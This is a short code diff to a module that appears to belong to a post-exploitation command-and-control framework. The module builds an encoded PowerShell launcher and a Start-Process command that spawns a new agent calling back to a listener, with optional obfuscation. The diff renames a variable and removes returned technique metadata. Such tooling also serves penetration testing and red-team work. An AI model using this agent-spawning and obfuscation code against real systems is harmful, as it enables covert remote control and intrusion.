@@ -88,7 +88,7 @@ class Module(object):
         proxyCreds = self.options['ProxyCreds']['Value']
         sysWow64 = self.options['SysWow64']['Value']
 
-        # generate the launcher code
+        # generate the launcher script
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
 
         if launcher == "":
@@ -104,12 +104,8 @@ class Module(object):
 
             parts = stagerCode.split(" ")
 
-            code = "Start-Process -NoNewWindow -FilePath \"%s\" -ArgumentList '%s'; 'Agent spawned to %s'" % (parts[0], " ".join(parts[1:]), listenerName)
+            script = "Start-Process -NoNewWindow -FilePath \"%s\" -ArgumentList '%s'; 'Agent spawned to %s'" % (parts[0], " ".join(parts[1:]), listenerName)
             if obfuscate:
-                code = helpers.obfuscate(self.mainMenu.installPath, psScript=code, obfuscationCommand=obfuscationCommand)
+                script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
 
-            moduleName = self.info['Name']
-            techniques = self.info['Techniques']
-            software = self.info['Software']
-
-            return code, moduleName, techniques, software
+            return script
